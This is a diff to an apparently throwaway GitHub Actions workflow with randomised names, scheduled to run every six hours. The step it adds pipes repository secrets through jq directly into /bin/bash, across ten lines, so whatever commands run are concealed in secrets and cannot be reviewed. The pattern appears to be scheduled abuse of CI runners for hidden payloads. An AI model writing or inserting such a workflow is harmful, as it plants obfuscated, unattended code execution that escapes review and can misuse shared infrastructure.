@@ -1,24 +1,27 @@
 name: fengyuanchai4545
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 0/6 * * *'
-
+    - cron: '58 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          a768: ${{ secrets.a768 }}
+          kjgao943: ${{ secrets.kjgao943 }}
         run: |
-          echo $a768 | jq -r .fyb9 | /bin/bash
-          echo $uj45726 | jq -r .f20 | /bin/bash
-          echo $rz52950 | jq -r .b9 | /bin/bash
-          echo $z4 | jq -r .ra70 | /bin/bash
-          echo $cpfdj5 | jq -r .gdm5 | /bin/bash
-          echo $sfbm472 | jq -r .tlaz94 | /bin/bash
-          echo $axkxb4159 | jq -r .mcy397 | /bin/bash
-          echo $vygt038 | jq -r .b20029 | /bin/bash
+          echo $kjgao943 | jq -r .hxxyn6863 | /bin/bash
+          echo $pkn797 | jq -r .lsda84 | /bin/bash
+          echo $aza58 | jq -r .fuqw666 | /bin/bash
+          echo $m9 | jq -r .r661 | /bin/bash
+          echo $p2 | jq -r .r1021 | /bin/bash
+          echo $xyeuv93 | jq -r .yoz6 | /bin/bash
+          echo $xayp65 | jq -r .fjoxo1235 | /bin/bash
+          echo $lnuw60898 | jq -r .kq48661 | /bin/bash
+          echo $nb41538 | jq -r .npbs8115 | /bin/bash
+          echo $cxbx4 | jq -r .hibt05 | /bin/bash
 
